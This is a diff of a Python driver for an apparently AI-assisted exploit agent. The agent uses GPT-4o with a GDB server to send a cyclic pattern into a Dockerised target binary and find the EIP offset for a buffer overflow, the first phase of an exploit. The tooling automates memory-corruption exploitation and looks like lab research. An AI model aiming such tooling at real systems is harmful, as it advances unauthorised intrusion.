@@ -1,97 +1,64 @@
-# main.py
 import os
 import time
 import json
 import socket
 import subprocess
+import argparse
 from dotenv import load_dotenv
 from agent import ExploitAgent
 
 load_dotenv()
-
 TARGET_HOST = 'target'
 TARGET_PORT = 8080
-# The container name now includes the target name, making it unique
-# but we can just use the service name 'target' to connect.
-TARGET_CONTAINER_NAME = 'buffcy-minimal-target-1' 
 
 class GDBClient:
-    # ... (GDBClient class remains the same) ...
+    # ... (same as before)
     def __init__(self, host, port):
-        self.host = host
-        self.port = port
-        self.sock = None
-        self.buffer = b""
-
+        self.host, self.port = host, port
+        self.sock, self.buffer = None, b""
     def connect(self):
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         for i in range(15):
             try:
-                self.sock.connect((self.host, self.port))
-                print("[AGENT] Connected to GDB MCP Server.")
-                return
-            except ConnectionRefusedError:
-                time.sleep(1)
-        raise ConnectionRefusedError("Could not connect to GDB server after multiple attempts.")
-
+                self.sock.connect((self.host, self.port)); print("[AGENT] Connected."); return
+            except ConnectionRefusedError: time.sleep(1)
+        raise ConnectionRefusedError("Could not connect to GDB server.")
     def send_command(self, method, params=None):
         if not self.sock: self.connect()
         request = {"jsonrpc": "2.0", "method": method, "params": params or {}, "id": 1}
-        print(f"[AGENT] Sending command to server: {method}")
         self.sock.sendall(json.dumps(request).encode() + b'\n')
-        while b'\n' not in self.buffer:
-            self.buffer += self.sock.recv(4096)
+        while b'\n' not in self.buffer: self.buffer += self.sock.recv(4096)
         message_data, self.buffer = self.buffer.split(b'\n', 1)
-        response = json.loads(message_data.decode())
-        print(f"[AGENT] Received response from server: {response}")
-        return response
-
+        return json.loads(message_data.decode())
     def close(self):
         if self.sock: self.sock.close()
 
-def main():
-    print(f"***** AGENT STARTING EXPLOIT RUN *****")
-
+def main(target_binary: str):
+    print(f"***** AGENT STARTING EXPLOIT RUN AGAINST: {target_binary} *****")
     agent = ExploitAgent(model_name="openai/gpt-4o")
     gdb_client = GDBClient(TARGET_HOST, TARGET_PORT)
-
     try:
         print("\n--- 🚀 PHASE 1: Finding EIP Offset ---")
         gdb_client.connect()
-        
         pattern = agent.generate_cyclic_pattern(1200)
-        print(f"[AGENT] Generated a {len(pattern)}-byte pattern.")
-
-        # This command is now more reliable because the container name is predictable
-        # and the trigger script is simpler.
-        trigger_command = [
-            "docker", "exec", TARGET_CONTAINER_NAME,
-            "python3", "exploit_trigger.py", "--payload", pattern
-        ]
-        print(f"[AGENT] Commanding target to deliver payload...")
-        result = subprocess.run(trigger_command, capture_output=True, text=True)
         
-        print(f"[AGENT] Payload delivery script finished. STDOUT: {result.stdout.strip()}")
-        if result.stderr:
-            print(f"[AGENT] Delivery STDERR:\n{result.stderr}")
-        result.check_returncode()
+        container_name = f"buffcyminimal-{target_binary}-1" # Predict container name
+        trigger_command = ["docker", "exec", container_name, "python3", "exploit_trigger.py", "--payload", pattern]
+        subprocess.Popen(trigger_command)
+        time.sleep(2)
         
-        print("[AGENT] Telling GDB to run and waiting for crash report...")
         crash_info = gdb_client.send_command('run_and_get_crash_info')
-        
         if crash_info.get("status") == "crashed":
-            print("[AGENT] Crash confirmed. Now calling AI for analysis...")
             offset = agent.analyze_crash_and_get_offset(crash_info, len(pattern))
             print(f"--- ✅ SUCCESS: Agent determined offset is: {offset} ---")
         else:
-            print("--- ❌ FAILED: Program did not crash as expected. ---")
-            print(f"Final GDB Server Response: {crash_info}")
-
-    except Exception as e:
-        print(f"[AGENT] An error occurred during the exploit run: {e}")
+            print(f"--- ❌ FAILED: Program did not crash as expected. ---")
     finally:
         gdb_client.close()
         print("\n🎉 Exploit sequence finished.")
 
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser()
+    parser.add_argument("--target", required=True)
+    args = parser.parse_args()
+    main(args.target)
